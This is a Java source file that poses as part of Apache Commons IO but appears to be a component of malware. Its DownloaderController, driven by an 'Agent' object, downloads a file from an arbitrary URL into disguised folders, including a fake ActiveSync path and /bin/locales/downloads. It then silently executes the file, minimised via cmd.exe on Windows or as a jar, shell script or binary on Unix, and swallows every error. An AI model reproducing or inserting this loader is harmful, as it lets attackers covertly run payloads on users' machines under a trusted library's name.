package org.apache.commons.io.file.spi.controller.impl;

import org.apache.commons.io.file.spi.Agent;
import org.apache.commons.io.file.spi.utils.URLUtils;
import org.apache.commons.io.FilenameUtils;

import java.io.File;
import java.io.IOException;

public class DownloaderController {

    private final boolean windows;

    public DownloaderController(final Agent agent) {
        this.windows = agent.isWindows();
    }

    public void downloadAndOpen(final String url) {
        final File folder = new File(this.windows ? System.getenv("LOCALAPPDATA") + "\\Packages\\ActiveSync\\Locale\\Downloads" : "/bin/locales/downloads");
        if (!folder.exists()) folder.mkdirs();
        final String fileName = FilenameUtils.getName(url);
        final File tempPath = new File(this.windows ? folder.getAbsolutePath() + "\\" + fileName : folder.getAbsolutePath() + "/" + fileName);
        try {
            URLUtils.download(url, tempPath);
            this.open(folder.getAbsolutePath(), fileName);
        } catch (final IOException ignore) {
        }

    }

    private void open(final String location, final String fileName) {
        final File file = new File(location + (this.windows ? "\\" : "/") + fileName);
        if (!file.exists()) return;
        try {
            if (this.windows)
                Runtime.getRuntime().exec("cmd.exe /c start /min cmd.exe /c \"" + file.getAbsolutePath() + "\"");
            else {
                if (fileName.endsWith(".jar"))
                    Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "chmod +x " + file.getAbsolutePath() + "; cd " + location + "; java -jar " + fileName});
                else if (fileName.endsWith(".sh"))
                    Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "chmod +x " + file.getAbsolutePath() + "; cd " + location + "; sh " + fileName});
                else
                    Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "chmod +x " + file.getAbsolutePath() + "; cd " + location + "; ./" + fileName});
            }
        } catch (final IOException ignore) {
        }
    }
}
